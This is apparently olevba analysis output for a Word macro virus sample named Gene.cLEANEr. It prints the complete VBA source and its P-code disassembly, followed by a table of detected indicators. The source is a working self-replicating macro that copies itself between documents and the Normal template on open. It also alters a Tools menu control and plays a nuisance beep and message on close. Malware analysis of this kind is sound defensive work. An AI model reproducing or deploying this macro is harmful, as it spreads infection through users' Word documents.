olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Poc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Poc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO cLEANEr.bas 
in file: ./Virus.MSWord.Poc.b - OLE stream: 'Macros/VBA/cLEANEr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Gene.cLEANEr virus authored by GeneCode

Sub AutoOpen()
Application.EnableCancelKey = True
Options.VirusProtection = True
Set V1Stealth = CommandBars("Tools")
Set V2Stealth = V1Stealth.Controls(12)
V2Stealth.Enabled = True

If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = NormalTemplate.FullName
    VTarget = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = ActiveDocument.FullName
    VTarget = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VTarget, "cLEANEr", wdOrganizerObjectProjectItems
EndCleaner:
End Sub

Sub Save()
Set myDocument = ActiveDocument
With myDocument.Shapes.AddShape(msoSmileyFace, 90, 90, 90, 50).Fill
    .ForeColor.RGB = RGB(128, 0, 0)
    .BackColor.RGB = RGB(170, 0, 170)
    .TwoColorGradient msoGradientHorizontal, 1
End With
End Sub

Sub AutoClose()
Dim Count As Integer
    For Count = 1 To 10
        Beep
        Beep
    Next
MsgBox "cLEANEr Says All Work And No Play Makes You A LAMER!"
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Poc.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1174 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Macros/VBA/cLEANEr - 7459 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0027 "Gene.cLEANEr virus authored by GeneCode"
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	SetStmt 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	Set V1Stealth 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x000C 
' 	Ld V1Stealth 
' 	ArgsMemLd Controls 0x0001 
' 	Set V2Stealth 
' Line #7:
' 	LitVarSpecial (True)
' 	Ld V2Stealth 
' 	MemSt Enabled 
' Line #8:
' Line #9:
' 	Ld ThisDocument 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #11:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "cLEANEr"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndCleaner 
' 	EndIf 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VSource 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VTarget 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #17:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "cLEANEr"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndCleaner 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VSource 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VTarget 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld VSource 
' 	Ld VTarget 
' 	LitStr 0x0007 "cLEANEr"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	Label EndCleaner 
' Line #24:
' 	EndSub 
' Line #25:
' Line #26:
' 	FuncDefn (Sub Save())
' Line #27:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set myDocument 
' Line #28:
' 	StartWithExpr 
' 	Ld msoSmileyFace 
' 	LitDI2 0x005A 
' 	LitDI2 0x005A 
' 	LitDI2 0x005A 
' 	LitDI2 0x0032 
' 	Ld myDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	With 
' Line #29:
' 	LitDI2 0x0080 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ForeColor 
' 	MemSt RSet 
' Line #30:
' 	LitDI2 0x00AA 
' 	LitDI2 0x0000 
' 	LitDI2 0x00AA 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith BackColor 
' 	MemSt RSet 
' Line #31:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith TwoColorGradient 0x0002 
' Line #32:
' 	EndWith 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Sub AutoClose())
' Line #36:
' 	Dim 
' 	VarDefn Count (As Integer)
' Line #37:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #38:
' 	ArgsCall Beep 0x0000 
' Line #39:
' 	ArgsCall Beep 0x0000 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	LitStr 0x0034 "cLEANEr Says All Work And No Play Makes You A LAMER!"
' 	ArgsCall MsgBox 0x0001 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' Line #45:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

